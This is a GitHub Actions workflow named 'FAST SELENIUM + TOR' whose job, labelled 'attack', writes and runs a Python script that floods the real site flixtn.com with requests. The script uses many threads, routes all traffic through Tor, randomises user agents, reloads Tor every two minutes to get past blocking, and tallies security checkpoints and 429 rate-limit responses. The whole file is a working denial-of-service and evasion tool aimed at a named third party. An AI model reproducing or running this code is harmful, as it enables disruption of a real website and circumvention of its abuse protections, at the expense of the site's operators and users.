name: 💀 FAST SELENIUM + TOR

on:
  workflow_dispatch:
    inputs:
      duration:
        description: 'المدة بالدقائق'
        required: true
        default: '60000'

jobs:
  attack:
    runs-on: ubuntu-latest
    timeout-minutes: 65
    
    steps:
      - name: Install
        run: |
          sudo apt update
          sudo apt install -y tor chromium-browser
          pip3 install selenium requests[socks] fake_useragent
          
      - name: Start Tor
        run: sudo systemctl start tor
        
      - name: 🔥 FAST ATTACK
        run: |
          cat > fast.py << 'EOF'
          import time
          import random
          import requests
          import threading
          import subprocess
          from selenium import webdriver
          from selenium.webdriver.chrome.options import Options
          from fake_useragent import UserAgent
          
          TARGET = "https://flixtn.com"
          DURATION = ${{ github.event.inputs.duration }} * 60000
          THREADS = 500
          
          stats = {"total":0, "ok":0, "fail":0, "block":0}
          lock = threading.Lock()
          running = True
          start = time.time()
          
          # إعداد Chrome عام (يستخدم مرة واحدة لكل خيط)
          def get_driver():
              opts = Options()
              opts.add_argument('--headless')
              opts.add_argument('--no-sandbox')
              opts.add_argument('--disable-dev-shm-usage')
              opts.add_argument('--disable-gpu')
              opts.add_argument('--proxy-server=socks5://127.0.0.1:9050')
              return webdriver.Chrome(options=opts)
          
          # هجوم Selenium (خيط واحد)
          def selenium_worker():
              driver = get_driver()
              while running:
                  try:
                      driver.get(TARGET)
                      time.sleep(0.5)
                      title = driver.title
                      with lock:
                          stats["total"] += 1
                          if "Checkpoint" in title or "Security" in title:
                              stats["block"] += 1
                              print("🛡️", end="", flush=True)
                          elif "FlixTN" in title or "FLIXTN" in title:
                              stats["ok"] += 1
                              print("✅", end="", flush=True)
                          else:
                              stats["fail"] += 1
                              print("⚠️", end="", flush=True)
                  except:
                      with lock:
                          stats["total"] += 1
                          stats["fail"] += 1
                      print(".", end="", flush=True)
                  time.sleep(0.3)
          
          # هجوم Curl سريع (خيوط متعددة)
          def curl_worker():
              session = requests.Session()
              session.proxies = {'http':'socks5h://127.0.0.1:9050','https':'socks5h://127.0.0.1:9050'}
              ua = UserAgent()
              while running:
                  try:
                      r = session.get(TARGET, timeout=5, headers={'User-Agent': ua.random})
                      with lock:
                          stats["total"] += 1
                          if r.status_code == 200:
                              stats["ok"] += 1
                              print("✓", end="", flush=True)
                          elif r.status_code == 429:
                              stats["block"] += 1
                              print("🔥", end="", flush=True)
                          else:
                              stats["fail"] += 1
                              print("✗", end="", flush=True)
                  except:
                      with lock:
                          stats["total"] += 1
                          stats["fail"] += 1
                      print(".", end="", flush=True)
                  time.sleep(0.05)
          
          def renew_tor():
              while running:
                  time.sleep(120)
                  subprocess.run(["sudo","systemctl","reload","tor"], check=False)
                  print("\n🔄 TOR")
          
          def printer():
              global running
              last = 0
              while running:
                  time.sleep(1)
                  elapsed = time.time() - start
                  with lock:
                      total = stats["total"]
                      ok = stats["ok"]
                      fail = stats["fail"]
                      block = stats["block"]
                      rps = total - last
                      last = total
                  if elapsed >= DURATION:
                      running = False
                      break
                  m = int(elapsed//60)
                  s = int(elapsed%60)
                  print(f"\n[{m:02d}:{s:02d}] T:{total:>5} ✅:{ok:>4} 🛡️:{block:>4} ✗:{fail:>4} RPS:{rps:>2}")
          
          print("="*50)
          print("🔥 FAST SELENIUM + TOR + CURL")
          print(f"Target: {TARGET}")
          print("="*50)
          print("✅=real  🛡️=checkpoint  ✓=200  🔥=429  .=error")
          print("")
          
          # تشغيل Tor
          subprocess.run(["sudo","systemctl","start","tor"], check=False)
          time.sleep(3)
          
          # خيط Selenium واحد
          threading.Thread(target=selenium_worker, daemon=True).start()
          
          # خيوط Curl متعددة
          for i in range(20):
              threading.Thread(target=curl_worker, daemon=True).start()
          
          # تجديد Tor
          threading.Thread(target=renew_tor, daemon=True).start()
          
          # مراقبة
          threading.Thread(target=printer, daemon=True).start()
          
          while running:
              time.sleep(0.5)
          
          elapsed = time.time() - start
          print("\n" + "="*50)
          print(f"DONE: {int(elapsed//60)}m {int(elapsed%60)}s")
          print(f"Total: {stats['total']:,} | OK: {stats['ok']:,} | Blocked: {stats['block']:,} | Fail: {stats['fail']:,}")
          if stats['total']>0:
              print(f"Success: {stats['ok']/stats['total']*100:.1f}%")
          print("="*50)
          EOF
          
          python3 fast.py
